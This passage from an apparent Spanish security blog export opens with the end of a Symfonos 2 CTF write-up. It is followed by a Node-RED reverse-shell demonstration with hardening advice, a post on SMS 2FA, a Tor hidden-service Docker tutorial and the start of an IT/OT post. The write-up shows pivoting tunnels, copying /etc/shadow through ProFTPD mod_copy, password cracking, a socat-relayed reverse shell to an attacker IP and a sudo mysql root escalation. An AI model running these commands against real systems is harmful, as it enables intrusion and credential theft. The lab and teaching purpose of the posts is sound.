10.10.10.3 correspondiente a Symfonos 2. A partir de aquí podríamos enumerar los host y puertos con un script, pero vamos a continuar directamente con la máquina Symfonos 2.\n\n# Symfonos 2\n\nEl procedimiento a continuación es entablar una comunicación desde nuestro equipo atacante, a la red *10.10.10.0/24* pasando por la máquina **Symfonos 1**.\n\n![](/static/images/uploads/symfonos-1-y-2-write-up/Symfonos-Proxychains.svg)\n\n## Entablamos la comunicación\n\nNos descargamos **Chisel** desde su [Github](https://github.com/jpillora/chisel/releases) con **wget**, y lo compartimos con **Symfonos 1**.\n\n\n```\nwget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz\ngunzip chisel_1.7.7_linux_amd64.gz\nmv chisel_1.7.7_linux_amd64 chisel\npython -m http.server 8080\n\n```\nY lo compartimos con **Symfonos 1**.\n\n\n```\nwget 192.168.1.138:8080/chisel\n\n```\nArrancamos **chisel** en modo servidor en nuestra máquina atacante.\n\n\n```\nchisel server --reverse -p 1234\n\n```\nY desde **Symfonos 1**, entablamos la comunicación con **Socks5**.\n\n\n```\nchisel client 192.168.1.138:1234 R:socks\n# When connection is stablished, chisel server output\n# 2023/01/13 23:32:12 server: session#3: tun: proxy#R:127.0.0.1:1080=socks: Listening\n\n```\nPor último, en nuestra máquina atacante, debemos configurar **Proxychains** para que sea capaz de tunelizar las peticiones a través de **Symfonos 1**.\n\n\n```\nnano /etc/proxychains.conf\n#[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to \"tor\"\n#socks4     127.0.0.1 9050\nsocks5 127.0.0.1 1080 # this port depends on Chisel result\n\n```\n## Enumeración de Symfonos 2\n\nEjecutamos **nmap** como al inicio, wrappeando la comunicación a través de **Proxychains**.\n\n\n```\nproxychains nmap --top-ports 50 -sT -vvv --open -n -Pn --min-rate 5000 10.10.10.3 -oG allPorts 2&1 | grep -vE \"timeout|OK\"\n\n```\n⚠️Recuerda que con **Proxychains**, no se puede utilizar la opción *-sS* porque entra en conflicto con el túnel. Hay que cambiar el parámetro a *-sT* para utilizar peticiones TCP normales.Se concatenan además unos comandos de limpieza porque **Proxychains** imprime más contenido del deseado. Los puertos abiertos son los siguientes: 21, 22, 80, 139, 445.\n\nAfinamos la búsqueda.\n\n\n```\nproxychains nmap -p21,22,80,139,445 --open -T5 -v -n -sTV -Pn 10.10.10.3 -oN targeted 2&1 | grep -vE \"OK\"\n# PORT    STATE SERVICE     VERSION\n# 21/tcp  open  ftp         ProFTPD 1.3.5\n# 22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n# 80/tcp  open  http        WebFS httpd 1.21\n# 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n# 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n# Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\n```\nSi nos comunicamos con Samba, vemos de nuevo que el acceso anónimo está permitido y nos encontramos un archivo log.txt que parece interesante.\n\n\n```\nproxychains smbmap -H 10.10.10.3 --download anonymous/backups/log.txt\n\n```\nSi lo examinamos, nos encontramos con lo siguiente (se han omitido cosas que no eran interesantes).\n\n\n```\nroot@symfonos2:~# cat /etc/shadow  /var/backups/shadow.bak\nroot@symfonos2:~# cat /etc/samba/smb.conf\n#\n# Sample configuration file for the Samba suite for Debian GNU/Linux.\n#\n#\n# This is the main Samba configuration file. You should read the\n# smb.conf(5) manual page in order to understand the options listed\n# here. Samba has a huge number of configurable options most of which \n# are not shown in this example\n...\n[anonymous]\n 258   │    path = /home/aeolus/share\n 259   │    browseable = yes\n 260   │    read only = yes\n 261   │    guest ok = yes\n...\nUser\t\t\t\taeolus\nGroup\t\t\t\taeolus\n...\n\n```\n* Existe una copia del *shadow* en */var/backups/shadow.bak*.\n* Existe el usuario **aeolus**\n* El path */home/aeolus/share* es visible de forma anónima por samba. Probablemente, ese sea el directorio donde estamos encontrando el archivo, este que acabamos de leer.\n\nA través de **smb** no se puede hacer nada más.\n\nContinuamos por **FTP** en el puerto 21.\n\n## ProFTPD 1.3.5 exploit\n\n**Searchsploit** nos arroja información sobre esta versión de **ftp**. Parece ser vulnerable\n\n\n```\nsearchsploit proftp 1.3.5\n# ProFTPd 1.3.5 - File Copy                                    | linux/remote/36742.txt\nsearchsploit -x linux/remote/36742.txt\n# Description TJ Saunders 2015-04-07 16:35:03 UTC\n# Vadim Melihow reported a critical issue with proftpd installations that use the\n# mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands to be used by *unauthenticated clients*:\n\n```\nPodemos copiar y pegar archivos de forma remota. Teniendo en cuenta que por **SMB** somos capaces de leer el directorio */home/aeolus/share*, podemos aprovechar esto para copiar ahí el backup del archivo */etc/shadow*.\n\n\n```\nproxychains ftp 10.10.10.3\nName (10.10.10.3:iocio): \n# 331 Password required for iocio\nPassword:\n# 530 Login incorrect.\n# Login failed.\n# Remote system type is UNIX.\n# Using binary mode to transfer files.\nftp site CPFR /var/backups/shadow.bak\n# 350 File or directory exists, ready for destination name\nftp site CPTO /home/aeolus/share/shadow\n# 250 Copy successful\nquit\n\n```\nYa estamos listos para descargarnos el archivo con **smb**.\n\n\n```\nproxychains smbmap -H 10.10.10.3 --download anonymous/shadow\n\n```\nVamos a probar con un poco de fuerza bruta, a ver si somos capaces de descifrar los hashes.\n\n## JohnTheRipper  Shadow\n\n\n```\njohn --wordlist=/usr/share/wordlists/rockyou.txt shadow\njohn --show shadow\n# aeolus:sergioteamo:18095:0:99999:7:::\n\n```\nParece que tenemos la contraseña del usuario `aeolus`, `sergioteamo`.\n\n\n```\nproxychains ssh aeolus@10.10.10.3\naeolus@symfonos2:~$ whoami\n# aeolus\naeolus@symfonos2:~$ hostname -I\n# 10.10.10.3\n\n```\nEstamos dentro de la máquina **Symfonos 2**.\n\n## Symfonos 2: Escalado\n\nCon el comando `ss`, buscamos conexiones de red expuestas.\n\n\n```\nss -tulpn\n# Netid  State      Recv-Q Send-Q                                   Local Address:Port\n# ...\n# tcp    LISTEN     0      128                                         127.0.0.1:8080\n# ...\n\n```\nParece ser que hay algo expuesto en el puerto 8080 del *localhost* de la máquina **Symfonos 2**.  \nPara poder acceder a ella, necesitamos redireccionar en nuestro equipo dicho puerto mediante un túnel **SSH**.\n\nCon el siguiente comando vamos a ello.\n\n\n```\nproxychains ssh -L 8080:127.0.0.1:8080 aeolus@10.10.10.3\n\n```\nUna vez hecho esto, abrimos **firefox** y accedemos a [*http://localhost:8080*](http://localhost:8080).\n\n![](/static/images/uploads/symfonos-1-y-2-write-up/LibreNMS.webp)\n\nDado que tenemos las credenciales del usuario **aeolus**, vamos a ver si podemos reutilizarlas en esta ventana de login.\n\n![](/static/images/uploads/symfonos-1-y-2-write-up/LibreNMS-Logged.webp)\n\nUna vez dentro, buscamos alguna vulnerabilidad en este **CMS**.\n\n\n```\nsearchsploit librenms\n# LibreNMS 1.46 - 'addhost' Remote Code Execution                  php/webapps/47044.py\n\n```\nEl script genera un **RCE** por SNMP cuando crea un dispositivo. Con ayuda de él y poniéndonos en escucha desde **Symfonos 1**.\n\n\n```\n$ whoami\n# cronus\n\n```\nPero vamos a complicarlo un poco más. Vamos a entablar una reverse shell hacia mi máquina atacante. Para ello, haremos uso de Socat.\n\nDesde **Symfonos 1**, ejecutamos el siguiente comando.\n\n\n```\nsocat TCP-LISTEN:4646,fork TCP:192.168.1.138:4646\n\n```\nDe esta manera, lo que haremos desde **Symfonos 1**, es que todo el tráfico que le llegue por el puerto 4646, lo redirigirá automáticamente al host *192.168.1.138*, que es el de mi máquina atacante.\n\n\n```\nnc -lvnp 4646\n# listening on [any] 4646 ...\n# connect to [192.168.1.138] from (UNKNOWN) [192.168.1.140] 54208\n# /bin/sh: 0: can't access tty; job control turned off\n$ whoami\ncronus\n\n```\nAdecuamos la TTY con un [tratamiento](https://ironhackers.es/tutoriales/como-conseguir-tty-totalmente-interactiva/) para poder utilizar el Ctrl+C, Ctrl+L y las flechas durante la sesión de la shell.\n\nAún queda ganar privilegios de root. Buscamos si tenemos permisos en la configuración de sudoers.\n\n\n```\nsudo -l\n# Matching Defaults entries for cronus on symfonos2:\n#     env_reset, mail_badpass,\n#     secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n# User cronus may run the following commands on symfonos2:\n#     (root) NOPASSWD: /usr/bin/mysql\n\n```\nCuando encontramos este tipo de permisos, conviene visitar [https://gtfobins.github.io/](https://gtfobins.github.io/gtfobins/mysql/#sudo) a ver si, de alguna manera, podemos acceder a la consola de root directamente.\n\nEn este caso, con el siguiente comando ejecutándolo como sudo, parece suficiente.\n\n\n```\nsudo mysql -e '\\! /bin/sh'\ncronus@symfonos2:/$ sudo mysql -e '\\! /bin/sh'\nwhoami\n# root\ncat /root/proof.txt\n\n\tCongrats on rooting symfonos:2!\n\n           ,   ,\n         ,-`{-`/\n      ,-~ , \\ {-~~-,\n    ,~  ,   ,`,-~~-,`,\n  ,`   ,   { {      } }                                             }/\n ;     ,--/`\\ \\    / /                                     }/      /,/\n;  ,-./      \\ \\  { {  (                                  /,;    ,/ ,/\n; /   `       } } `, `-`-.___                            / `,  ,/  `,/\n \\|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;\n  `        { {                                     __  /  ,`/   ,`,;\n        /   \\ \\                                 _,`, `{  `,{   `,`;`\n       {     } }       /~\\         .-:::-.     (--,   ;\\ `,}  `,`;\n       \\\\._./ /      /` , \\      ,:::::::::,     `~;   \\},/  `,`;     ,-=-\n        `-..-`      /. `  .\\_   ;:::::::::::;  __,{     `/  `,`;     {\n                   / , ~ . ^ `~`\\:::::::::::~-,,`,    `-,  ``,_    }\n                /~~ . `  . ~  , .`~~\\:::::::;    _-~  ;__,        `,-`\n       /`\\    /~,  . ~ , '  `  ,  .` \\::::;`   ~```   ``-,,__   ;\n      /` .`\\ /` .  ^  ,  ~  ,  . ` . ~\\~                       \\\\, `,__\n     / ` , ,`\\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \\\n    / , ~ . ~ \\ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``\n  /` ` . ~ . ` `\\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___\n/` . `  ,  . ~ , \\  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,\n\n\tContact me via Twitter @zayotic to give feedback!\n\n```\n"
    },
    {
        "title": "¿Por qué deberías proteger Node-RED?",
        "slug": "por-que-deberias-proteger-node-red",
        "date": "2023-01-15",
        "tags": [],
        "images": [
            "/static/images/uploads/por-que-deberias-proteger-node-red/nodered-pwned.webp",
            "/static/images/uploads/por-que-deberias-proteger-node-red/image-4.webp",
            "/static/images/uploads/por-que-deberias-proteger-node-red/nodered-esquema-2.svg",
            "/static/images/uploads/por-que-deberias-proteger-node-red/image-3.webp",
            "/static/images/uploads/por-que-deberias-proteger-node-red/image-5.webp"
        ],
        "draft": false,
        "summary": "Reto CTF: Node-RED es una herramienta de programación visual con nodos que se comunican entre sí. Se pueden aprovechar vulnerabilidades como ejecución de comandos y acciones de entrada/salida por TCP para comprometer el sistema. Es importante proteger Node-RED mediante el uso de autenticación, HTTPS y la deshabilitación de nodos innecesarios. No debemos confiarnos solo por usar contenedores.",
        "content": "![](/static/images/uploads/por-que-deberias-proteger-node-red/nodered-pwned.webp)\n\n## ¿Qué es Node-RED?\n\nEsta es la parte más aburrida del post, por lo que me voy a permitir el lujo de copiarlo de otro sitio en Internet.\n\n\n Node-RED es una herramienta de **programación visual que se implementa en dispositivos controladores de *hardware*****.** Trabaja mostrando de manera visual las relaciones y funciones de manera que se pueda programar sin escribir. Es un **panel** de ***flow*** al que se pueden incorporar nodos que se comuniquen entre ellos y puede instalarse en equipos como ordenadores Windows, Linux, o en servidores en la nube. Este sistema de representaciónpuede ayudarte a visualizar gráficamente el flujo de la información y consiste en su representación gráfica.\n\nEn otras palabras, es una plataforma que mediante cajitas que hacen distintas cosas, eres capaz de crear un **workflow** de una forma visual y ver su representación de un solo vistazo.\n\n## Preparación del escenario\n\n1. Arranco **Docker** en mi ordenador de casa con **Windows 11**.\n\n\n```\n@ikero ➜ ~ docker run -it -p 1880:1880 -v node_red_data:/data --name mynodered nodered/node-red\n```\n2. Mapeo el puerto *1880* del contenedor al *1880* de **Windows**, para que sea visible por otros equipos.\n\n3. Confirmo que el contenedor está funcionando correctamente y podemos empezar con la prueba de concepto.\n\n![](/static/images/uploads/por-que-deberias-proteger-node-red/image-4.webp)\n\n⚠️Esta prueba se realiza utilizando contenedores Docker, pero es también posible hacerlo sin utilizar ninguna tecnología de contenedorización.## De qué forma es vulnerable\n\nArranco una máquina virtual de tal forma que simularemos ser el atacante de la prueba. El esquema es el siguiente.\n\n![](/static/images/uploads/por-que-deberias-proteger-node-red/nodered-esquema-2.svg)\n\nMi máquina virtual es capaz de acceder al puerto *1880* del PC con *Windows 11* corriendo el contenedor de **Node-RED**.\n\n![](/static/images/uploads/por-que-deberias-proteger-node-red/image-3.webp)\n\nLos nodos de los cuales voy a sacar provecho son los siguientes:\n\n* **exec**: Ejecuta un comando de sistema y devuelve su salida.\n* **tcp in**: Provee una muestra de acciones de entrada por TCP.\n* **tcp out**: Provee una muestra de acciones de salida por TCP.\n\nSon solamente necesarios estos tres nodos para comprometer el sistema. El siguiente flujo entabla una **shell reversa** por el puerto *9999*\n\n![](/static/images/uploads/por-que-deberias-proteger-node-red/image-5.webp)\n\nMe pongo en escucha desde la máquina atacante con la IP 192.168.1.138 y veamos que ocurre.\n\n\n```\nsudo socat -d -d TCP-LISTEN:9999 STDOUT\n# 2023/01/15 02:57:47 socat[64557] W ioctl(5, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device\n# 2023/01/15 02:57:47 socat[64557] N listening on AF=2 0.0.0.0:9999\n# 2023/01/15 02:57:56 socat[64557] N accepting connection from AF=2 192.168.1.132:64267 on AF=2 192.168.1.138:9999\n# 2023/01/15 02:57:56 socat[64557] N using stdout for reading and writing\n# 2023/01/15 02:57:56 socat[64557] N starting data transfer loop with FDs [6,6] and [1,1]\nwhoami\n# node-red\nls /\n# bin\n# data\n# dev\n# etc\n# healthcheck.js\n# home\n# lib\n# media\n# mnt\n# opt\n# proc\n# root\n# run\n# sbin\n# srv\n# sys\n# tmp\n# usr\n# var\n```\nYa tenemos acceso a la Shell del contenedor Docker. No debemos pensar bajo ningún concepto que por el hecho de usar contenedores ya estamos protegidos. Existen varias vulnerabilidades de tipo [Container Escape Vulnerability](https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities) que hace que no debamos bajar la guardia simplemente por el hecho de usar contenedores.\n\nA partir de aquí, debes pensar que cualquier cosa que estuviese dentro de tu sistema (o en otros sistemas, porque también se puede acabar saltando hacia otros equipos vulnerables del entorno) ha podido ser robada. Ya sean **Api Keys** que utilizas para subir los datos a un proveedor **Cloud** o contraseñas para acceder a otros sistemas que hayas pensado que almacenarlos dentro de una carpeta del contenedor era una buena idea.\n\n## Cómo puedo hacerlo (un poco) más seguro.\n\nLo primero es seguir las recomendaciones que dice su propia página en https://nodered.org/docs/user-guide/runtime/securing-node-red.\n\nEn la primera línea nos encontramos el siguiente mensaje.\n\n⚠️By default, the Node-RED editor is not secured - anyone who can access its IP address can access the editor and deploy changes.A partir de aquí, lo que debe ser un **MUST** en nuestra configuración debe ser:\n\n* Habilitar la ventana de Login en todos los casos.\n* Separar credenciales entre los editores de los flujos y los usuarios normales.\n* Habilitar HTTPs. Aunque sea con certificados autofirmados.\n* Deshabilitar aquellos nodos que creamos que no son necesarios para nuestro tipo de trabajo. O mejor aún, deshabilitar todos y habilitar SOLO aquellos que son necesarios.\n\nLos flujos de Node-RED son, al fin y al cabo, una manera de desarrollar software \"más sencilla\". El hecho de ver una interfaz amigable no debe despistarnos de lo que es la plataforma en sí. Abrir la puerta a que cualquiera pueda desarrollar sus flujos sin ningún tipo de cuidado, puede ser peligroso.\n\n"
    },
    {
        "title": "No, Twitter no es inseguro",
        "slug": "no-twitter-no-ha-dejado-de-ser-seguro",
        "date": "2023-02-20",
        "tags": [],
        "images": [
            "/static/images/uploads/no-twitter-no-ha-dejado-de-ser-seguro/twitter_2fa.webp",
            "/static/images/uploads/no-twitter-no-ha-dejado-de-ser-seguro/2fa_Excalidraw-1.webp",
            "/static/images/uploads/no-twitter-no-ha-dejado-de-ser-seguro/post_d5_txt3.webp"
        ],
        "draft": false,
        "summary": "Reto CTF que consiste en analizar la seguridad de la autenticación de Twitter. Se atacan las vulnerabilidades de la autenticación de doble factor vía SMS y se sugiere utilizar métodos más seguros como TOTP o USB key.",
        "content": "![](/static/images/uploads/no-twitter-no-ha-dejado-de-ser-seguro/twitter_2fa.webp)\n\nDe hecho, n(os) ha hecho un favor.\n\n# Contexto\n\nEl pasado [15 de febrero de 2023](https://blog.twitter.com/en_us/topics/product/2023/an-update-on-two-factor-authentication-using-sms-on-twitter) Twitter anunció que hacía un cambio en su política de seguridad. El cambio consistía en que el método de autenticación de doble factor vía SMS solo iba a mantenerse para aquellos usuarios que estuviesen suscritos a Twitter Blue. O dicho de otra manera, si no pagas 8€/mes, pierdes esta funcionalidad.\n\nNo son pocos los medios como [antena3](https://www.antena3.com/noticias/tecnologia/twitter-cobrara-usuarios-proteger-sus-cuentas-autenticacion-dos-pasos-mediante-sms_2023021863f108f52b5c780001355f72.html), [CNN](https://cnnespanol.cnn.com/2023/02/19/twitter-cobrara-autenticacion-de-dos-factores-sms-trax/) u otros tecnológicos como [Xataka](https://www.xataka.com/empresas-y-economia/pagas-u-olvidate-identificacion-dos-pasos-sms-ultimo-elon-para-empujar-twitter-blue) que se han hecho eco de esta noticia diciendo que Twitter despliega esta medida para favorecer a los usuarios de pago dejando en la estacada a aquellos que no pagasen por su marca de verificado o su [Twitter Blue](https://help.twitter.com/es/using-twitter/twitter-blue). Que la seguridad de una plataforma ahora es algo de unos pocos privilegiados. Y es que esta afirmación, es cuanto menos engañosa. Una media verdad que no busca informar realmente a las personas. Vamos a examinar por qué.\n\n**Twitter ofrece (ofrecía) [3 métodos](https://help.twitter.com/es/managing-your-account/two-factor-authentication) diferentes de autenticación de doble factor (o 2FA).**\n\n* 2FA vía SMS\n* 2FA vía TOTP app (time based one time password)\n* 2FA vía USB key\n\nEn resumidas cuentas, lo que los 3 métodos consiguen, es que para acceder a tu cuenta, sea necesario una segunda forma de identificación. Y de las 3, **la que funciona mediante SMS es la más débil de todas**.\n\nEn este post de Norton podemos encontrarnos el siguiente titular: [SIM swap scams on the rise](https://us.norton.com/blog/mobile/sim-swap-fraud#).\n\n💡Según el FBI, los estafadores recurren cada vez con más frecuencia a las estafas de SIM swap. La oficina informó de que en 2021, el FBI recibió 1.611 informes de este tipo de delito. Las pérdidas superaron los 68 millones de dólares.   \n  \nDesde enero de 2018 hasta diciembre de 2020, el FBI recibió solo 320 denuncias de SIM swap, y las víctimas de estos delitos perdieron alrededor de 12 millones de dólares.Aun en 2023, es relativamente fácil la forma en la que alguien puede suplantar nuestra tarjeta SIM, ya sea mediante ingeniería social contra uno de los operadores de nuestra compañía telefónica (la forma más común de llevarlo a cabo) o clonando físicamente la tarjeta. Y con ello, el 2FA sostenido mediante SMS pasa a ser absurdamente inútil. De hecho, si tu banco te envía por SMS una clave para acceder a tu cuenta corriente, CAMBIA de banco.\n\n**Twitter, a día de hoy y no parece que vaya a cambiar, sigue permitiendo utilizar los otros 2 métodos de autenticación de doble factor para TODOS los usuarios, independientemente de su tipo de cuenta.**\n\nSolo aquellos que pagan, pueden seguir utilizando el método (más) inseguro de los 3.\n\n# Que es 2FA\n\nLa autenticación en dos fases (**2FA**) es un **método de seguridad de administración de identidad y acceso que requiere dos formas de identificación para obtener acceso a los recursos y los datos.**\n\nLa forma de funcionamiento es la siguiente:\n\n![](/static/images/uploads/no-twitter-no-ha-dejado-de-ser-seguro/2fa\\_Excalidraw-1.webp)\n\n1. Inicias sesión en una plataforma mediante un usuario y una contraseña.\n2. Si la contraseña es correcta, se genera un desafio. Este desafio consiste en introducir una clave válida.\n3. Dependiendo el método de **2FA** que tengas configurado, tienes hasta 3 formas de generar esa clave válida.  \n\n3.1. Te llega un SMS con una clave.  \n\n3.2. Mediante un USB especial, lo introduces en el ordenador y la aplicación lo reconoce, dando paso en caso de ser un USB correcto.  \n\n3.3. Mediante una aplicación tipo [Latch](https://latch.elevenpaths.com/) o Google Authenticator, se genera una clave que dura unos segundos y que tienes que introducir como desafio.\n\n\n# Cómo podemos mejorar la seguridad\n\n¿De qué forma podemos incrementar la seguridad de acceso a una plataforma? Hay un mecanismo que, si bien no es infalible, dificulta mucho que alguien pueda suplantar nuestra identidad. La mejor forma de autenticación es cuando el método de autenticación tiene en cuenta las siguientes 3 cosas:\n\n* **Algo que sabes**, como por ejemplo un pin o una contraseña.\n* **Algo que tienes**, como por ejemplo un dispositivo, token o aplicación.\n* **Algo que eres,** (autenticación biométrica), como una huella dactilar o reconocimiento facial.\n\n[Algo que sabes, algo que tienes y algo que eres. ¿Sabes de qué estamos hablando?En la actualidad la utilización de contraseñas es un elemento básico y casi podríamos decir que cotidiano. Sin embargo, sigue presentando debilidades, relacionadas con la limitada capacidad humana![](https://www.incibe.es/protege-tu-empresa/blog/algo-sabes-tienes-eres-contrasenas-identidad-online)Existen muchas aplicaciones en el mercado que permiten implementar **2FA** (o incluso **MFA**) como [Latch](https://latch.elevenpaths.com/), [Google Authenticator](https://support.google.com/accounts/answer/1066447?hl=en&co=GENIE.Platform%3DAndroid) o [Microsoft Authenticator](https://www.microsoft.com/en-us/security/mobile-authenticator-app).\n\nPero tienen también su parte mala.\n\n* Para acceder a ellas, necesitarás una contraseña. Intenta que ésta sea lo suficientemente segura como para que no te la puedan robar.\n* En algunos casos como **Google Auth**, si pierdes el dispositivo, tienes que contactar hasta con el mismísimo Joe Biden para recuperar el acceso al dispositivo.\n\nEn definitiva, dependes al 100% de este mecanismo para acceder a todas tus cuentas.\n\nPersonalmente, me quedo con **Latch**, puesto que puedes configurar un método de autenticación biométrico para abrirla y si pierdes el dispositivo, puedes iniciar sesión desde cualquier sitio conectado a internet.\n\n# Conclusión\n\nTwitter sigue siendo tan seguro (o inseguro) como lo era antes. De hecho, se puede afirmar que trata mejor a sus usuarios gratuitos en este sentido que a aquellos que pasan por caja.\n\nCualquier plataforma hoy en día permite utilizar 2FA como método de autenticación alternativa y entre ellas, la que funciona vía SMS es la más insegura. Esto no quiere decir que dejemos de utilizarla si es nuestro caso. Siempre será mejor esto que entrar en tu cuenta solo con la contraseña. Pero como siempre, cuanto más mecanismos de seguridad utilices en tus cuentas, estarás un poco más protegido que los que no utilizan ninguna.\n\n"
    },
    {
        "title": "Despliega un hidden service en la red TOR (Deep Web)",
        "slug": "despliega-una-web-en-la-red-tor-deep-web",
        "date": "2023-04-24",
        "tags": [],
        "images": [
            "/static/images/uploads/despliega-una-web-en-la-red-tor-deep-web/tor-hidden-background-1.webp",
            "/static/images/uploads/despliega-una-web-en-la-red-tor-deep-web/tor-network-schema.webp",
            "/static/images/uploads/despliega-una-web-en-la-red-tor-deep-web/tor-nginx-bash.webp",
            "/static/images/uploads/despliega-una-web-en-la-red-tor-deep-web/matrix-tor.webp"
        ],
        "draft": false,
        "summary": "En este artículo, aprenderás cómo desplegar una web en la red Tor, también conocida como Deep Web. Exploraremos qué es un hidden service en Tor y sus características. También veremos los archivos necesarios y cómo configurarlos en Docker. Finalmente, te mostraré cómo probar y acceder a una web en la red Tor utilizando Tor Browser.",
        "content": "![](/static/images/uploads/despliega-una-web-en-la-red-tor-deep-web/tor-hidden-background-1.webp)\n\nVamos a ver lo fácil que es publicar una web (*hidden service*) que solo es visible dentro de la red Toro lo que más llanamente se conoce como **Deep Web.**\n\n## Introducción\n\nUn *hidden service* en la red Tor se refiere a un servicio o sitio web que se aloja en una red anónima dentro de la Deep Web. Estos sitios web no son accesibles a través de Internet público, sino que solo se pueden acceder a través de un navegador especializado denominado *[Tor Browser](https://www.torproject.org/es/download/)*. Puedes descargarlo de forma gratuita desde [https://torproject.org/es/download/](https://www.torproject.org/es/download/).\n\nLos sitios web de *hidden service* se ejecutan en servidores dentro de la red Tor y se identifican por una dirección *.onion* en lugar de una dirección IP convencional. Estas direcciones *.onion* se generan automáticamente y son únicas para cada sitio web, lo que los hace difíciles de rastrear y localizar. La pinta que tienen son las de un *hash* aleatorio generado por una clave pública. Por ejemplo: *ca4p2udpkmrambici5vs3e3bqsqelorqr6lzr5cdk2ab7acsyp2njiid.onion*\n\nDebido a que estos sitios web están alojados en una red anónima, los usuarios que acceden a ellos también permanecen en el anonimato. Esto los convierte en sitios populares para actividades ilegales, como la venta de drogas, armas y servicios de *hacking*, pero también se utilizan para actividades legítimas, como la comunicación anónima o el periodismo.\n\n## Archivos necesarios\n\nUtilizaremos **Docker** para lanzar los servicios necesarios, así como la web que queremos publicar.\n\n* Nos basaremos en una imagen de Nginx para el servidor web.\n* Instalaremos los paquetes necesarios para conectarnos con Tor y sincronizar la hora del servidor para que el puente que se establece en la red sea capaz de cifrar/descifrar los paquetes correctamente.\n* Reemplazaremos los archivos de configuración *torrc* y *nginx.conf* necesarios en nuestra imagen Docker para que cumpla con nuestros requisitos.\n\nEste es el **Dockerfile**.\n\n\n```\nFROM nginx:1.24.0\n\n# Base packages\nRUN apt-get update && \\\n    apt-get -y install \\\n    tor torsocks ntpdate \\\n    qrencode\n\n# Tor Config\nCOPY ./torrc /etc/tor/torrc\n\n# Nginx configuration \nCOPY ./web/ /usr/share/nginx/html/\nCOPY ./nginx.conf /etc/nginx/conf.d/nginx.conf\nEXPOSE 80\n\n# Entrypoint copy\nCOPY files/entrypoint.sh /entrypoint.sh\n\nENTRYPOINT [\"/entrypoint.sh\"]\n```\nNo hay mucho que señalar. Basándonos en la imagen base de Nginx, instalamos los paquetes y copiamos algunos archivos a la imagen de Docker.\n\nVamos a echarle un vistazo a **torrc**, un archivo de configuración para personalizar la forma en que el cliente Tor funciona. Este archivo se encuentra dentro de */etc/tor/torrc* pero el manifiesto de Docker ya se encargará de dejarlo donde debe.\n\n\n```\nDataDirectory /tmp/tor\nHiddenServiceDir /var/lib/tor/hidden_service/\nHiddenServicePort 80 127.0.0.1:80\nLog notice stdout\n```\n*HiddenServiceDir* y *HiddenServicePort* son las claves más importantes de este archivo.\n\nEl primero, específica donde deseas que Tor genere la clave publica/privada, así como el hostname de la web donde se encontrará la web. Esta carpeta es muy importante y conviene tener los permisos del directorio correctos porque alguien podría atacar nuestra máquina a través del directorio, perdiendo todo el anonimato para los clientes que se conectan a nosotros.\n\nEl segundo, le dice a Tor donde está el servicio web al que tiene que redirigir todo el trafico. En este caso, especificamos que todas las peticiones que entren por el puerto *80* sean redirigidas al *127.0.0.1:80* donde estará la web sirviendo el contenido.\n\nA continuación, vamos a echarle un vistazo al archivo de **Nginx.conf**.\n\n\n```\nserver {\n  listen 127.0.0.1:80 default_server;\n  server_name localhost;\n\n  root /usr/share/nginx/html;\n  index index.html;\n\n  location / {\n    allow 127.0.0.1;\n    deny all;\n  }\n}\n```\nEs un archivo muy básico que puede ser extendido sin ningún problema, pero debemos fijarnos en la definición de *'location /'.*\n\n![Tor network schema](/static/images/uploads/despliega-una-web-en-la-red-tor-deep-web/tor-network-schema.webp)\n\n**Solo se permitirán las peticiones provenientes de 127.0.0.1**, localhost, y **se denegará el resto de peticiones** que pudiesen llegar a la máquina. Es decir, estas dos líneas son las que diferencian a un servidor web normal de uno en la Deep Web, y el servicio Tor que hemos instalado es el que se encarga de redirigir peticiones que vengan de su red como hemos visto en Torrc.\n\n## Demo\n\n1. Descargamos Tor Browser para instalarlo en el equipo: https://www.torproject.org/es/download/\n2. Descargamos el repositorio listo para ser ejecutado.\n\n\n```\ngit clone https://github.com/0x10-z/docker-tor-nginx\ncd docker-tor-nginx\ndocker-compose up\n```\n3. Cuando tengamos el servicio corriendo en la terminal, buscamos una entrada como la siguiente:\n\n![](/static/images/uploads/despliega-una-web-en-la-red-tor-deep-web/tor-nginx-bash.webp)\n\nCopiamos en el portapapeles la URL generada *nq35a2auw5abqiz5sgtfj4yzggdak3n3roci4cmppo64nujh33plz4ad.onion*\n\n4. Pegamos la URL en el navegador Tor y a disfrutar.\n\n![Matrix Tor](/static/images/uploads/despliega-una-web-en-la-red-tor-deep-web/matrix-tor.webp)\n\n"
    },
    {
        "title": "Ciberseguridad en el mundo industrial. IT vs. OT.",
        "slug": "ciberseguridad-en-redes-ot-vs-redes-it-que-son-y-como-protegerlas",
        "date": "2023-06-04",
        "tags": [],
        "images": [
            "/static/images/uploads/ciberseguridad-en-redes-ot-vs-redes-it-que-son-y-como-protegerlas/IT-vs-OT_Featured.webp",
            "/static/images/uploads/ciberseguridad-en-redes-ot-vs-redes-it-que-son-y-como-protegerlas/ITvsOT.webp"
        ],
        "draft": false,
        "summary": "La ciberseguridad en redes OT y redes IT presenta desafíos distintos. Las redes IT enfrentan mayores riesgos de ataques cibernéticos, mientras que las redes OT están expuestas a ataques físicos. En las redes IT, la confidencialidad es prioritaria, mientras que en las redes OT, la disponibilidad es clave. Implementar medidas de seguridad especializadas es fundamental para proteger ambas redes.",
